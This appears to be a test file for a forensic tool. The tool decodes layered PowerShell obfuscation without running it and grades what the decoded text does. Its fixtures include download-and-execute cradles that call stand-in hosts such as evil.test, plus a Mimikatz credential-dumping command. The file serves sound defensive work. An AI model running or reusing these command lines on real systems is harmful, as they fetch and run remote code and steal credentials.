import { describe, it, expect } from "vitest";
import { gzipSync, deflateSync } from "node:zlib";
import {
  decodeLayers,
  DECODER_VERSION,
  MAX_DEPTH,
  MAX_OUTPUT,
} from "../../src/analysis/deobfuscateLayers.js";
import { applyDeobfuscation } from "../../src/analysis/applyDeobfuscation.js";
import { scriptBlockSignal } from "../../src/analysis/tradecraftRules.js";

const b64 = (s: string): string => Buffer.from(s, "utf8").toString("base64");
const b64utf16 = (s: string): string => Buffer.from(s, "utf16le").toString("base64");

describe("decodeLayers — nesting", () => {
  it("peels a base64 payload that decodes to another base64 payload", () => {
    const inner = "IEX (New-Object Net.WebClient).DownloadString('http://evil.test/a.ps1')";
    const outer = `powershell -enc ${b64utf16(`[Convert]::FromBase64String('${b64(inner)}')`)}`;
    const r = decodeLayers(outer);
    expect(r).not.toBeNull();
    expect(r?.decoded).toContain("evil.test");
    expect(r?.steps.length).toBeGreaterThan(1);
    expect(r?.steps[0].method).toBe("powershell-enc");
  });

  it("records every layer it peeled, in order", () => {
    const r = decodeLayers(
      `powershell -enc ${b64utf16(`echo ${b64("hello world, this inner payload is long enough to scan")}`)}`,
    );
    expect(r?.steps.map((s) => s.method)).toEqual(["powershell-enc", "base64"]);
  });

  it("stops at the depth limit and says the result is partial", () => {
    // Each layer wraps the previous one in another FromBase64String call.
    let payload = "final-marker-value-here";
    for (let i = 0; i < MAX_DEPTH + 3; i++) {
      payload = `[Convert]::FromBase64String('${b64(payload)}')`;
    }
    const r = decodeLayers(payload);
    expect(r?.steps.length).toBeLessThanOrEqual(MAX_DEPTH);
    expect(r?.partial).toBe(true);
  });
});

describe("decodeLayers — compression", () => {
  it("inflates a gzip payload carried as base64", () => {
    const inner = "IEX (New-Object Net.WebClient).DownloadString('http://gz.test/x')";
    const packed = gzipSync(Buffer.from(inner, "utf8")).toString("base64");
    const r = decodeLayers(`[IO.Compression.GzipStream] '${packed}'`);
    expect(r?.decoded).toContain("gz.test");
    expect(r?.steps.some((s) => s.method === "gzip")).toBe(true);
  });

  it("inflates a raw deflate payload carried as base64", () => {
    const inner = "Invoke-Expression 'http://df.test/y'";
    const packed = deflateSync(Buffer.from(inner, "utf8")).toString("base64");
    const r = decodeLayers(`[IO.Compression.DeflateStream] '${packed}'`);
    expect(r?.decoded).toContain("df.test");
  });

  it("refuses to expand a decompression bomb past the output ceiling", () => {
    const bomb = gzipSync(Buffer.alloc(MAX_OUTPUT * 4, 0x41)).toString("base64");
    const r = decodeLayers(`[IO.Compression.GzipStream] '${bomb}'`);
    expect(r?.partial).toBe(true);
    expect(r?.decoded.length ?? 0).toBeLessThanOrEqual(MAX_OUTPUT);
  });
});

describe("decodeLayers — constant folding, never evaluation", () => {
  it("rebuilds a string from character codes", () => {
    const r = decodeLayers("&([char]105+[char]101+[char]120) 'http://code.test/p'");
    expect(r?.decoded).toContain("iex");
    expect(r?.steps.some((s) => s.method === "char-codes")).toBe(true);
  });

  it("rebuilds a string from a char array join", () => {
    const r = decodeLayers("[char[]](105,101,120) -join '' ; http://arr.test");
    expect(r?.decoded).toContain("iex");
  });

  it("resolves the format operator with constant arguments", () => {
    const r = decodeLayers("\"{1}{0}\" -f 'X','IE' ; http://fmt.test");
    expect(r?.decoded).toContain("IEX");
    expect(r?.steps.some((s) => s.method === "format")).toBe(true);
  });

  it("resolves a constant -replace chain", () => {
    const r = decodeLayers("('iXXx' -replace 'XX','e') 'http://rep.test'");
    expect(r?.decoded).toContain("iex");
    expect(r?.steps.some((s) => s.method === "replace")).toBe(true);
  });

  it("resolves a reversal of a literal whose range covers the whole string", () => {
    const r = decodeLayers("'xei'[-1..-3] -join '' ; http://rev.test");
    expect(r?.decoded).toContain("iex");
  });

  // Binding $s means tracking assignments, which is interpretation rather than folding. The old
  // pattern matched this and produced `$s=iex ''`, which is not what PowerShell computes.
  it("refuses to fold a reversal that indexes a variable", () => {
    const r = decodeLayers("$s='xei'; $s[-1..-3] -join '' ; http://rev.test");
    expect(r).toBeNull();
  });

  // `[-1..-2]` on a 4-character literal is a SUBSTRING, not a full reversal.
  it("refuses to fold a reversal whose range does not cover the string", () => {
    expect(decodeLayers("'abcd'[-1..-2] -join '' ; http://part.test")).toBeNull();
  });

  // PowerShell -replace is regex and case-insensitive; a literal split/join is only faithful for a
  // metacharacter-free pattern.
  it("refuses to fold a -replace whose pattern is a regex", () => {
    const r = decodeLayers("('abc' -replace '.','X') 'http://meta.test'");
    expect(r?.decoded ?? "").not.toContain("XXX");
  });

  it("folds -replace case-insensitively, as PowerShell does", () => {
    const r = decodeLayers("('ABCiXXx' -replace 'xx','e') 'http://ci.test'");
    expect(r?.decoded).toContain("iex");
  });

  it("refuses an empty -replace pattern rather than expanding it quadratically", () => {
    const big = "A".repeat(2000);
    const rep = "B".repeat(2000);
    const r = decodeLayers(`('${big}' -replace '','${rep}') 'http://bomb.test'`);
    expect(r?.decoded.length ?? 0).toBeLessThanOrEqual(MAX_OUTPUT);
  });

  // A -replace whose arguments are variables is not a constant expression. Guessing at it would
  // mean running the script, which this module must never do.
  it("leaves a non-constant expression alone and reports the result as partial", () => {
    const r = decodeLayers("('iXXx' -replace $a,$b) ; http://var.test");
    if (r) {
      expect(r.decoded).not.toContain("iex");
      expect(r.partial).toBe(true);
    }
  });
});

describe("decodeLayers — bounds and refusals", () => {
  it("returns null when there is nothing to decode", () => {
    expect(decodeLayers("Get-ChildItem C:\\Users -Recurse")).toBeNull();
  });

  it("returns null for an empty string", () => {
    expect(decodeLayers("")).toBeNull();
  });

  it("stamps the decoder version so a later run can find stale results", () => {
    const r = decodeLayers(`powershell -enc ${b64utf16("echo marker-value-long-enough")}`);
    expect(r?.version).toBe(DECODER_VERSION);
  });

  it("never returns more than the output ceiling", () => {
    const big = "A".repeat(MAX_OUTPUT * 2);
    const r = decodeLayers(`powershell -enc ${b64utf16(big)}`);
    expect(r?.decoded.length ?? 0).toBeLessThanOrEqual(MAX_OUTPUT);
  });

  it("does not treat ordinary base64-looking text as a payload without an execution marker", () => {
    // A long hash or key in a benign command must not be decoded and reported as a payload.
    expect(decodeLayers("git commit -m 'aGVsbG8gd29ybGQgdGhpcyBpcyBub3QgYSBwYXlsb2Fk'")).toBeNull();
  });
});

describe("applyDeobfuscation — versioned reanalysis", () => {
  const b64u16 = (s: string): string => Buffer.from(s, "utf16le").toString("base64");
  const inner = "IEX (New-Object Net.WebClient).DownloadString('http://stale.test/a')";
  const desc = `powershell -enc ${b64u16(`[Convert]::FromBase64String('${b64(inner)}')`)}`;

  const stateWith = (deob?: Record<string, unknown>) =>
    ({
      caseId: "C1",
      iocs: [],
      forensicTimeline: [
        {
          id: "e1",
          timestamp: "2026-01-01T00:00:00Z",
          description: desc,
          severity: "High",
          ...(deob ? { deobfuscated: deob } : {}),
        },
      ],
    }) as never;

  it("decodes an untouched event and stamps the decoder version", () => {
    const r = applyDeobfuscation(stateWith());
    expect(r.deobfuscated).toBe(1);
    expect(r.reanalyzed).toBe(0);
    const d = r.state.forensicTimeline[0].deobfuscated;
    expect(d?.version).toBe(DECODER_VERSION);
    expect(d?.steps?.length).toBeGreaterThan(1);
  });

  it("leaves a stale result alone by default — reanalysis is a decision, not a side effect", () => {
    const stale = { decoded: "old single-layer text", method: "base64", iocs: [], version: 1 };
    const r = applyDeobfuscation(stateWith(stale));
    expect(r.reanalyzed).toBe(0);
    expect(r.state.forensicTimeline[0].deobfuscated?.decoded).toBe("old single-layer text");
  });

  it("re-decodes a stale result when asked, and reaches the inner payload", () => {
    const stale = { decoded: "old single-layer text", method: "base64", iocs: [], version: 1 };
    const r = applyDeobfuscation(stateWith(stale), { reanalyzeStale: true });
    expect(r.reanalyzed).toBe(1);
    const d = r.state.forensicTimeline[0].deobfuscated;
    expect(d?.decoded).toContain("stale.test");
    expect(d?.version).toBe(DECODER_VERSION);
  });

  it("does not re-decode a result already produced by the current decoder", () => {
    const current = { decoded: "x", method: "base64", iocs: [], version: DECODER_VERSION };
    const r = applyDeobfuscation(stateWith(current), { reanalyzeStale: true });
    expect(r.reanalyzed).toBe(0);
  });
});

describe("decodeLayers — material that only looks like a layer", () => {
  it("does not decode a hex hash inside a payload as another base64 layer", () => {
    const hash = "b".repeat(64);
    const r = decodeLayers(`powershell -enc ${b64utf16(`$checksum="${hash}"; Verify-FileHash`)}`);
    expect(r?.decoded).toContain(hash);
    expect(r?.steps.map((s) => s.method)).toEqual(["powershell-enc"]);
  });

  it("does not report latin1 mojibake as a recovered payload", () => {
    const r = decodeLayers(`powershell -enc ${b64utf16(`$sha="${"a".repeat(64)}"; Compare-Hash`)}`);
    expect(r?.decoded).not.toMatch(/[\u0080-\uFFFF]{8,}/);
  });
});

describe("applyDeobfuscation — the derived text gets the behaviour checks", () => {
  const b64u16 = (s: string): string => Buffer.from(s, "utf16le").toString("base64");
  const stateOf = (payload: string, iocs: unknown[] = [], deob?: unknown) =>
    ({
      caseId: "C1",
      iocs,
      forensicTimeline: [
        {
          id: "e1",
          timestamp: "2026-01-01T00:00:00Z",
          description: `powershell -enc ${b64u16(payload)}`,
          severity: "Info",
          ...(deob ? { deobfuscated: deob } : {}),
        },
      ],
    }) as never;

  it("raises severity and techniques from what the DECODED payload does", () => {
    // The grader is injected, not imported: the behaviour rules are in the detect domain and the
    // deobfuscation pass is in the privacy domain, an edge the module map does not allow.
    const r = applyDeobfuscation(stateOf("Invoke-Mimikatz -DumpCreds ; sekurlsa::logonpasswords"), {
      gradeDerived: scriptBlockSignal,
    });
    const e = r.state.forensicTimeline[0];
    expect(e.severity).toBe("High");
    expect(e.mitreTechniques ?? []).toContain("T1003");
  });

  it("never lowers a severity the event already had", () => {
    const s = stateOf("echo just a harmless decoded string here");
    (s as { forensicTimeline: { severity: string }[] }).forensicTimeline[0].severity = "Critical";
    const r = applyDeobfuscation(s, { gradeDerived: scriptBlockSignal });
    expect(r.state.forensicTimeline[0].severity).toBe("Critical");
  });

  it("retires an indicator that only the previous decode recovered", () => {
    const stale = {
      decoded: "http://gone.test/old",
      method: "base64",
      iocs: ["i001"],
      version: 1,
    };
    const iocs = [{ id: "i001", type: "domain", value: "gone.test", firstSeen: "2026-01-01T00:00:00Z" }];
    const r = applyDeobfuscation(stateOf("echo nothing recoverable in here at all", iocs, stale), {
      reanalyzeStale: true,
    });
    expect(r.state.iocs.some((i) => i.id === "i001")).toBe(false);
  });

  it("keeps an indicator that existed before any decoding", () => {
    const iocs = [{ id: "i001", type: "domain", value: "kept.test", firstSeen: "2026-01-01T00:00:00Z" }];
    const r = applyDeobfuscation(stateOf("echo nothing recoverable in here at all", iocs), {
      reanalyzeStale: true,
    });
    expect(r.state.iocs.some((i) => i.id === "i001")).toBe(true);
  });
});
